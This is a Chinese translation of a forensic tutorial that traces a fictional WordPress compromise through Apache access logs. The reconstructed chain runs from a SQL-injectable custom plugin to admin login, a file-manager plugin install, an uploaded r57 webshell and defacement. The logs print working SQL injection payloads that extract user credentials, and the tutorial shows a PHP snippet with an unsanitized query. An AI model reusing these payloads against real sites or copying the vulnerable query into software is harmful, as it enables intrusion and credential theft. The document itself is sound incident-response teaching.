> 原文链接: https://www.anquanke.com//post/id/86391 


# 【技术分享】调查Web应用攻击事件：如何通过服务器日志文件追踪攻击者


                                阅读量   
                                **99906**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：dzone.com
                                <br>原文地址：[https://dzone.com/articles/using-logs-to-investigate-a-web-application-attack](https://dzone.com/articles/using-logs-to-investigate-a-web-application-attack)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01d7b847100ffd55a1.png)](https://p0.ssl.qhimg.com/t01d7b847100ffd55a1.png)



译者：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



如果你想寻找那些让你系统遭受攻击的漏洞或起因的话，我建议你可以从日志记录开始着手调查。

存储在服务器端的日志文件是一种非常有价值的信息，几乎所有的服务器、在线服务和应用程序都会提供各种各样的日志信息。但你真的知道日志文件到底为何物吗？日志文件可以记录一个服务或应用程序在运行过程中所发生的事件和活动。那为什么日志文件会如此重要呢？因为日志文件可以让我们对服务器的所有行为一目了然，日志会告诉我们一台服务器在什么时候被什么人用什么样的方式访问过，而这些信息不仅可以帮助我们监控服务器或应用程序的性能和异常信息，而且还可以帮助我们调试应用程序。更重要的是，日志可以帮助取证调查人员分析可能那些导致恶意活动的事件链。

接下来，我以一台Web服务器作为例子来进行讲解。一般来说，Apache HTTP服务器会提供两种主要的日志文件，即access.log和error.log。access.log会记录所有针对文件的请求，如果访问者请求了www.example.com/main.php，那么下面这项日志条目便会添加到日志文件中：

```
88.54.124.17 - - [16/Apr/2016:07:44:08 +0100] "GET /main.php HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"<br>
```

上面这条日志信息描述的是：一名访问者请求获取main.php文件，他的IP地址为88.54.124.178，请求时间为2016年4月16日07时44分，请求状态为“成功”。<br>

你可能会认为这些信息并没有什么意义，那如果服务器记录下的是：访问者（IP：88.54.124.178）在2016年4月16日07时44分请求访问了dump_database.php文件，并且请求成功，那么这下可就麻烦了！

如果没有日志文件的话，你可能永远都不会知道谁访问过你的服务器，或谁导出过你的数据库记录。而且更加可怕的是，你永远都不会知道谁在你的服务器中运行过恶意脚本…

既然大家都已经知道了日志文件的重要性，那么接下来让我们一起看一看在日常工作中日志文件如何帮助我们确认网站是如何被攻击的。

<br>

**分析调查**



我们先假设下面这种场景：我们所管理的一个网站遭到了攻击，该网站非常的简单，这是一个过期的WordPress站点，运行在最新版的Ubuntu服务器上。

[![](https://p0.ssl.qhimg.com/t0189666d803f6b730c.png)](https://p0.ssl.qhimg.com/t0189666d803f6b730c.png)

发现网站被攻击之后，取证团队迅速将服务器下线，以便进行下一步的分析调查。

隔离服务器是为了保持系统当前的状态以及相关的日志记录，并防止远程攻击者和其他的网络设备继续访问该服务器。调查分析的目的是识别出该Web服务器上所发生的恶意活动，为了保证调查数据的完整性，我们首先要对目标服务器进行备份，然后对克隆出来的服务器镜像进行分析。不过考虑到我们并不打算追究攻击者的法律责任，所以我们可以直接在原始数据上进行分析研究。

<br>

**调查过程中需要的证据**



在开始调查之前，首先得确定我们需要那些证据。一般来说，攻击证据包含攻击者对隐藏文件或关键文件得访问记录、对管理员权限区域内的非授权访问、远程代码执行、SQL注入、文件包含、跨站脚本（XSS）以及其他的一些异常活动，而这些证据从一定程度上可以代表攻击者所进行的漏洞扫描以及侦察活动。

假设在我们的场景中，Web服务器的access.log是可获取的：

```
root@secureserver:/var/log/apache2# less access.log<br>
```

access.log的体积一般都非常庞大，通常包含成千上万条请求记录：<br>



```
84.55.41.57 - - [16/Apr/2016:20:21:56 +0100] "GET /john/index.php HTTP/1.1" 200 3804 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"<br>84.55.41.57 - - [16/Apr/2016:20:21:56 +0100] "GET /john/assets/js/skel.min.js HTTP/1.1" 200 3532 "http://www.example.com/john/index.php" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"<br>84.55.41.57 - - [16/Apr/2016:20:21:56 +0100] "GET /john/images/pic01.jpg HTTP/1.1" 200 9501 "http://www.example.com/john/index.php" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"<br>84.55.41.57 - - [16/Apr/2016:20:21:56 +0100] "GET /john/images/pic03.jpg HTTP/1.1" 200 5593 "http://www.example.com/john/index.php" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"<br>
```

你想要一行一行地检查这些数据几乎是不现实的，所以我们要筛选出有用的数据，比如说类似图片或CSS样式表这样的资源数据，有的调查人员还会筛选出JavaScript文件等等。<br>

在我们的场景中，由于网站运行的是WordPress，所以我们需要筛选出access.log文件中与WordPress有关的字符：

```
root@secureserver:~#cat /var/log/apache2/access.log | grep -E "wp-admin|wp-login|POST /"<br>
```

上面这行命令会将access.log文件中包含wp-admin、wp-login以及POST等关键字的记录筛选出来。其中，wp-admin是WordPress的默认管理员文件夹，wp-login是WordPress的登陆文件，POST方法表明发送至服务器端的HTTP请求使用的是POST方法，一般来说都是登录表单提交。<br>

过滤结果包含多条数据，在经过仔细分析之后，我们将注意力主要集中在以下数据上：

```
84.55.41.57 - - [17/Apr/2016:06:52:07 +0100] "GET /wordpress/wp-admin/ HTTP/1.1" 200 12349 "http://www.example.com/wordpress/wp-login.php" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"<br>
```

我们可以看到，IP地址84.55.41.57成功访问了WordPress管理员目录。<br>

接下来，我们看一看这个IP地址还做了些什么。这里我们还得使用grep命令来过滤access.log中包含这个IP地址的日志条目：

```
root@secureserver:~#cat /var/log/apache2/access.log | grep 84.55.41.57<br>
```

搜索结果如下：<br>



```
84.55.41.57 - - [17/Apr/2016:06:57:24 +0100] "GET /wordpress/wp-login.php HTTP/1.1" 200 1568 "-"<br>84.55.41.57 - - [17/Apr/2016:06:57:31 +0100] "POST /wordpress/wp-login.php HTTP/1.1" 302 1150 "http://www.example.com/wordpress/wp-login.php"<br>84.55.41.57 - - [17/Apr/2016:06:57:31 +0100] "GET /wordpress/wp-admin/ HTTP/1.1" 200 12905 "http://www.example.com/wordpress/wp-login.php"<br>84.55.41.57 - - [17/Apr/2016:07:00:32 +0100] "POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1" 200 454 "http://www.example.com/wordpress/wp-admin/"<br>84.55.41.57 - - [17/Apr/2016:07:00:58 +0100] "GET /wordpress/wp-admin/theme-editor.php HTTP/1.1" 200 20795 "http://www.example.com/wordpress/wp-admin/"<br>84.55.41.57 - - [17/Apr/2016:07:03:17 +0100] "GET /wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme=twentysixteen HTTP/1.1" 200 8092 "http://www.example.com/wordpress/wp-admin/theme-editor.php"<br>84.55.41.57 - - [17/Apr/2016:07:11:48 +0100] "GET /wordpress/wp-admin/plugin-install.php HTTP/1.1" 200 12459 "http://www.example.com/wordpress/wp-admin/plugin-install.php?tab=upload"<br>84.55.41.57 - - [17/Apr/2016:07:16:06 +0100] "GET /wordpress/wp-admin/update.php?action=install-plugin&amp;plugin=file-manager&amp;_wpnonce=3c6c8a7fca HTTP/1.1" 200 5698 "http://www.example.com/wordpress/wp-admin/plugin-install.php?tab=search&amp;s=file+permission"<br>84.55.41.57 - - [17/Apr/2016:07:18:19 +0100] "GET /wordpress/wp-admin/plugins.php?action=activate&amp;plugin=file-manager%2Ffile-manager.php&amp;_wpnonce=bf932ee530 HTTP/1.1" 302 451 "http://www.example.com/wordpress/wp-admin/update.php?action=install-plugin&amp;plugin=file-manager&amp;_wpnonce=3c6c8a7fca"<br>84.55.41.57 - - [17/Apr/2016:07:21:46 +0100] "GET /wordpress/wp-admin/admin-ajax.php?action=connector&amp;cmd=upload&amp;target=l1_d3AtY29udGVudA&amp;name%5B%5D=r57.php&amp;FILES=&amp;_=1460873968131 HTTP/1.1" 200 731 "http://www.example.com/wordpress/wp-admin/admin.php?page=file-manager_settings"<br>84.55.41.57 - - [17/Apr/2016:07:22:53 +0100] "GET /wordpress/wp-content/r57.php HTTP/1.1" 200 9036 "-"<br>84.55.41.57 - - [17/Apr/2016:07:32:24 +0100] "POST /wordpress/wp-content/r57.php?14 HTTP/1.1" 200 8030 "http://www.example.com/wordpress/wp-content/r57.php?14"<br>84.55.41.57 - - [17/Apr/2016:07:29:21 +0100] "GET /wordpress/wp-content/r57.php?29 HTTP/1.1" 200 8391 "http://www.example.com/wordpress/wp-content/r57.php?28"<br>84.55.41.57 - - [17/Apr/2016:07:57:31 +0100] "POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1" 200 949 http://www.myw ebsite.com/wordpre ss/wp-admin/admin.php?page=file-manager_settings<br>
```

我们可以看到，攻击者访问了网站的登录界面：<br>

```
84.55.41.57 - GET /wordpress/wp-login.php 200<br>
```

攻击者提交了登录表单（POST方法），网站重定向成功（302 HTTP状态码）：<br>

```
84.55.41.57 - POST /wordpress/wp-login.php 302<br>
```

攻击者被重定向到了wp-admin（WordPress仪表盘），这意味着攻击者成功通过了身份验证：<br>

```
84.55.41.57 - GET /wordpress/wp-admin/ 200<br>
```

攻击者访问了网站的主题编辑器：<br>

```
84.55.41.57 - GET /wordpress/wp-admin/theme-editor.php 200<br>
```

攻击者尝试去编辑404.php文件，很多攻击者都会向这个文件注入恶意代码，这是一种常见的攻击技巧。但由于缺少文件写入权限，所以攻击者没能成功：<br>

```
84.55.41.57 - GET /wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme= twentysixteen 200<br>
```

攻击者还访问了插件安装器：<br>

```
84.55.41.57 - GET /wordpress/wp-admin/plugin-install.php 200<br>
```

攻击者安装并激活了file-namager插件：<br>



```
84.55.41.57 - GET /wordpress/wp-admin/update.php?action=install-plugin&amp;plugin= file-manager &amp;_wpnonce=3c6c8a7fca 200<br>84.55.41.57 - GET /wordpress/wp-admin/plugins.php?action=activate&amp;plugin=file-manager%2Ffile-manager.php&amp;_wpnonce=bf932ee530 200<br>
```

攻击者使用file-namager插件上传了r57.php（一个PHP Webshell脚本）：<br>

```
84.55.41.57 - GET /wordpress/wp-admin/admin-ajax.php?action=connector&amp; cmd= upload&amp;target=l1_d3AtY29udGVudA&amp;name%5B%5D=r57.php&amp;FILES=&amp;_=1460873968131 200<br>
```

日志表明，攻击者成功运行了r57 Shell脚本。查询字符串”?1”和”?28”表明攻击者通过脚本代码进行了网站导航，不过他什么也没有发现：<br>



```
84.55.41.57 - GET /wordpress/wp-content/r57.php 200<br>84.55.41.57 - POST /wordpress/wp-content/r57.php?1 200<br>84.55.41.57 - GET /wordpress/wp-content/r57.php?28 200<br>
```

攻击者最后的一项操作是通过file-manager插件编辑主题的index文件并将其内容替换成了单词”HACKED！”：<br>



```
84.55.41.57 - POST /wordpress/wp-admin/admin-ajax.php 200 - http://www.<br>example.com/wordpress/wp-admin/admin.php?page=file-manager_settings<br>
```

根据上述信息。我们得到了攻击者所有恶意活动的时间轴。但目前还有一个问题没有弄清楚，即攻击者一开始是如何得到管理员凭证的？<br>

假设管理员密码既没有泄漏也没有被暴力破解，那么我们就得回头看看我们是不是忽略了什么信息。

当前这份access.log中并不包含任何有关管理员凭证得线索，不过我们并不是只有一个access.log文件可以调查。Apache HTTP服务器中还提供了很多其他的日志文件，比如说/var/log/apache2/目录下就有四个可以调查的日志文件。首先，我们可以过滤出包含 IP地址 84.55.41.57的日志条目。我们发现，其中有一份日志文件中包含了大量与[SQL注入攻击](https://dzone.com/articles/sqli-how-it-works-part-1)（貌似针对的是一个自定义插件）有关的记录信息：



```
84.55.41.57- - [14/Apr/2016:08:22:13 0100] "GET /wordpress/wp-content/plugins/custom_plugin/check_user.php?userid=1 AND (SELECT 6810 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(6810=6810,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) HTTP/1.1" 200 166 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"<br>84.55.41.57- - [14/Apr/2016:08:22:13 0100] "GET /wordpress/wp-content/plugins/custom_plugin/check_user.php?userid=(SELECT 7505 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(7505=7505,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) HTTP/1.1" 200 166 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"<br>84.55.41.57- - [14/Apr/2016:08:22:13 0100] "GET /wordpress/wp-content/plugins/custom_plugin/check_user.php?userid=(SELECT CONCAT(0x7171787671,(SELECT (ELT(1399=1399,1))),0x71707a7871)) HTTP/1.1" 200 166 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"<br>84.55.41.57- - [14/Apr/2016:08:22:27 0100] "GET /wordpress/wp-content/plugins/custom_plugin/check_user.php?userid=1 UNION ALL SELECT CONCAT(0x7171787671,0x537653544175467a724f,0x71707a7871),NULL,NULL-- HTTP/1.1" 200 182 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"<br>
```

我们假设这个插件是系统管理员从网上直接下载并拷贝到网站之中的，而这个脚本可以根据给定的ID来查询用户的合法性。该插件在网站的主页面中提供了一个表单，该表单会向/wordpress/wp-content/plugins/custom_plugin/check_user.php发送一个AJAX GET请求。<br>

通过对check_user.php文件进行了分析之后，我们发现这个脚本的代码写得非常烂，而且存在SQL注入漏洞：



```
&lt;?php<br>//Include the WordPress header<br>include('/wordpress/wp-header.php');<br>global $wpdb;<br>// Use the GET parameter ‘userid’ as user input<br>$id=$_GET['userid'];<br>// Make a query to the database with the value the user supplied in the SQL statement <br>$users = $wpdb-&gt;get_results( "SELECT * FROM users WHERE user_id=$id");<br>?&gt;<br>
```

上述信息表明，攻击者使用了SQL注入工具来利用这个插件所带来的SQL注入漏洞，而且这款漏洞利用工具尝试了多种SQL注入技术来枚举数据库名、表名和列名:<br>

```
/wordpress/wp-content/plugins/my_custom_plugin/check_user.php?userid=-6859 UNION ALL SELECT (SELECT CONCAT(0x7171787671,IFNULL(CAST(ID AS CHAR),0x20),0x616474686c76,IFNULL(CAST(display_name AS CHAR),0x20),0x616474686c76,IFNULL(CAST(user_activation_key AS CHAR),0x20),0x616474686c76,IFNULL(CAST(user_email AS CHAR),0x20),0x616474686c76,IFNULL(CAST(user_login AS CHAR),0x20),0x616474686c76,IFNULL(CAST(user_nicename AS CHAR),0x20),0x616474686c76,IFNULL(CAST(user_pass AS CHAR),0x20),0x616474686c76,IFNULL(CAST(user_registered AS CHAR),0x20),0x616474686c76,IFNULL(CAST(user_status AS CHAR),0x20),0x616474686c76,IFNULL(CAST(user_url AS CHAR),0x20),0x71707a7871) FROM wp.wp_users LIMIT 0,1),NULL,NULL--<br>
```

注：有关SQL注入漏洞的解决方案请参考[这篇文章](https://www.acunetix.com/blog/articles/preventing-and-fixing-sql-injection-vulnerabilities-in-php-applications/)。<br>

上述信息足以表明网站的WordPress数据库遭到了攻击，而数据库中存储的数据很可能已经发生了泄露。

**<br>**

**分析**



通过此次调查，我们得出了攻击者的攻击事件链。

[![](https://p1.ssl.qhimg.com/t01c6c557d8976fe82b.png)](https://p1.ssl.qhimg.com/t01c6c557d8976fe82b.png)

不过现在还有很多问题没解决，比如说攻击者到底是谁？目前来说，我们只知道攻击者的IP地址，而且攻击者一般都会使用代理服务器或类似Tor这样的匿名网络来掩盖其真实的IP地址。除非攻击者留下了与他真实身份有关的证据，否则我们很难得知攻击者的真实身份。

在对日志记录进行了分析之后我们得知，网站管理员所使用的那款自定义WordPress插件中存在安全漏洞，并导致了SQL注入攻击的发生。但如果网站在真正上线之前进行了完整的安全漏洞测试的话，攻击者肯定就无法利用这种漏洞来实施攻击了。

在上面这个我虚构出的场景中，攻击者其实是非常草率的，因为他留下了大量攻击痕迹和取证证据，而这些信息将给调查人员提供很大的帮助。但在真实的攻击场景中，攻击者可不会留下多少有用的信息。

<br>


